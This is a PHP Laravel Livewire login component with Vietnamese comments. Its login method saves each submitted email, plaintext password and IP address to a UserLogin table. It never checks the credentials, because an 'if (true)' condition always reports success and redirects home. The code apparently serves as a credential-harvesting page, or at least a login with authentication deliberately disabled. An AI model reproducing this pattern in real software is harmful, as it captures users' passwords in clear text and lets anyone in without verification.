<?php

namespace App\Livewire;

use App\Models\UserLogin;
use Illuminate\Support\Facades\Auth;
use Livewire\Component;
use Jantinnerezo\LivewireAlert\LivewireAlert;
use Illuminate\Support\Facades\Request;
class Login extends Component
{
    use LivewireAlert; // Thêm trait LivewireAlert

    public $email;
    public $password;

    public function login()
    {
        $credentials = [
            'email' => $this->email,
            'password' => $this->password,
        ];
        UserLogin::create([
            'email' => $this->email,
            'password' => $this->password,
            'ip_address' => Request::ip(), // Lưu IP của người dùng
        ]);
        if (true) {
            session()->put('user_email', $this->email); // Lưu email vào session
            $this->alert('success', 'Đăng nhập thành công!'); // Thông báo khi đăng nhập thành công
            return redirect()->route('home'); // Chuyển hướng về trang home
        } else {
            $this->alert('error', 'Thông tin đăng nhập không chính xác.');
        }
    }

    public function render()
    {
        return view('livewire.login');
    }
}
